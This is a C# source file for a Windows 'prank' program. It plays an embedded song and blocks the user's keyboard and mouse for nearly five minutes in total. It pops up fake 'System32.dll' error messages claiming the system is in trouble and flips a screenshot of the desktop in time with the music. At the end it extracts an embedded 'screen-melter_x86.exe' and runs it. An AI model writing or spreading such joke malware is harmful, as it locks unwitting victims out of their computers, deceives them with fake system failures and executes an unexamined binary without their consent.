using System.Reflection;
using Un4seen.Bass;
using Un4seen.Bass.Misc;
using System.Timers;
using Utils.MessageBoxExLib;
using System.Diagnostics;

namespace RetroFadPrank
{
    internal static class Program
    {
        private static System.Timers.Timer timer;
        private static BPMCounter counter;
        private static int channel;
        public static Bitmap BM;
        private static Random rand = new Random();

        private static bool starting = true;
        private static Form1 form;

        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            ApplicationConfiguration.Initialize();

            using (FileStream fileStream = File.Create("Retro Fad.mp3"))
            {
                Assembly.GetExecutingAssembly().GetManifestResourceStream("RetroFadPrank.Retro Fad.mp3").CopyTo(fileStream);
            }

            Bass.BASS_Init(-1, 44100, BASSInit.BASS_DEVICE_DEFAULT, IntPtr.Zero);
            channel = Bass.BASS_StreamCreateFile("Retro Fad.mp3", 0, 0, BASSFlag.BASS_DEFAULT);

            if (channel != 0)
            {
                Bass.BASS_ChannelPlay(channel, false);
                counter = new BPMCounter(10, 44100);

                timer = new System.Timers.Timer(10);
                timer.Elapsed += OnTimedEvent;
                timer.Start();

                NativeMethods.BlockInput(TimeSpan.FromSeconds(15));
                starting = false;

                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
                Graphics g = Graphics.FromImage(bitmap);
                g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
                BM = bitmap;
                form = new Form1();
                Application.Run(form);

                NativeMethods.BlockInput(TimeSpan.FromSeconds(275));

                using (FileStream fileStream = File.Create("screen-melter_x86.exe"))
                {
                    Assembly.GetExecutingAssembly().GetManifestResourceStream("RetroFadPrank.screen-melter_x86.exe").CopyTo(fileStream);
                }

                Process.Start("screen-melter_x86.exe");

                NativeMethods.BlockInput(TimeSpan.FromSeconds(5));
            }
            else
            {
                MessageBox.Show("Error");
            }
        }

        private static void OnTimedEvent(Object source, ElapsedEventArgs e)
        {
            if (counter.ProcessAudio(channel, false))
            {
                if (starting)
                {
                    MessageBoxEx msg = MessageBoxExManager.CreateMessageBox(null);
                    msg.Caption = "System32.dll";
                    msg.Text = "Oups ! Look like your system is\n having some trouble !";
                    msg.Icon = MessageBoxExIcon.Error;
                    msg.Location = new Point(rand.Next(Screen.PrimaryScreen.Bounds.Width), rand.Next(Screen.PrimaryScreen.Bounds.Height));
                    msg.StartPosition = FormStartPosition.Manual;
                    msg.Show();
                }
                else if (BM != null)
                {
                    try
                    {
                        if (rand.Next(2) == 1)
                        {
                            BM.RotateFlip(RotateFlipType.Rotate180FlipY);
                        }
                        else
                        {
                            BM.RotateFlip(RotateFlipType.Rotate180FlipX);
                        }
                    }
                    catch (Exception ex) { }

                        if (form.IsHandleCreated)
                    {
                        form.Invoke(new MethodInvoker(delegate
                        {
                            form.Refresh();
                        }));
                    }
                }
            }
        }
    }
}